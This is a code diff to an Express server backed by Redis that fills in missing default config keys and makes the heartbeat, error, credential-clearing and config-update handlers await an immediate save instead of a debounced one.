@@ -424,6 +424,14 @@ function ensureStoreLoaded() {
                 Object.assign(store, redisStore);
                 const defs = getDefaultStore();
                 Object.keys(defs).forEach(k => { if (!store[k]) store[k] = defs[k]; });
+                // Merge any missing defaultConfig keys (e.g. new fields added after initial deploy)
+                if (store.config) {
+                    Object.keys(defaultConfig).forEach(k => {
+                        if (!(k in store.config)) store.config[k] = defaultConfig[k];
+                    });
+                } else {
+                    store.config = { ...defaultConfig };
+                }
                 if (!IS_VERCEL) console.log('Loaded store from Redis (' + Object.keys(store.clients || {}).length + ' clients)');
             }
         }).catch(e => {
@@ -787,7 +795,7 @@ app.post('/heartbeat', rateLimit(30, 10000), async (req, res) => {
             store.clients[clientId].onlineSince = null;
             addEvent('client_disconnected', { clientId });
         }
-        await saveStore();
+        await forceSave();
         return res.json({ success: true });
     }
 
@@ -1208,14 +1216,14 @@ app.get('/api/errors', requireAuth, (req, res) => {
 
 app.delete('/api/errors', requireAuth, async (req, res) => {
     store.errors = [];
-    await saveStore();
+    await forceSave();
     res.json({ success: true });
 });
 
 app.delete('/api/errors/:id', requireAuth, async (req, res) => {
     const before = store.errors.length;
     store.errors = store.errors.filter(e => e.id !== req.params.id);
-    if (store.errors.length < before) await saveStore();
+    if (store.errors.length < before) await forceSave();
     res.json({ success: true, deleted: before - store.errors.length });
 });
 
@@ -1270,9 +1278,9 @@ app.get('/api/credentials', requireAuth, (req, res) => {
     res.json(d.slice(0, limit));
 });
 
-app.delete('/api/credentials', requireAuth, (req, res) => {
+app.delete('/api/credentials', requireAuth, async (req, res) => {
     store.credentials = [];
-    saveStore();
+    await forceSave();
     res.json({ success: true });
 });
 
@@ -1445,9 +1453,9 @@ app.delete('/api/client/:id', requireAuth, async (req, res) => {
 // ═══════════════════════════════════════════════════════════════
 app.get('/api/config', (req, res) => res.json(store.config || defaultConfig));
 
-app.post('/api/config', requireAuth, (req, res) => {
+app.post('/api/config', requireAuth, async (req, res) => {
     store.config = { ...(store.config || defaultConfig), ...req.body };
-    saveStore();
+    await forceSave(); // must be immediate — debounced saveStore() won't fire on Vercel serverless
     console.log('\u{2699}\u{FE0F}  Config updated');
     res.json({ success: true, config: store.config });
 });
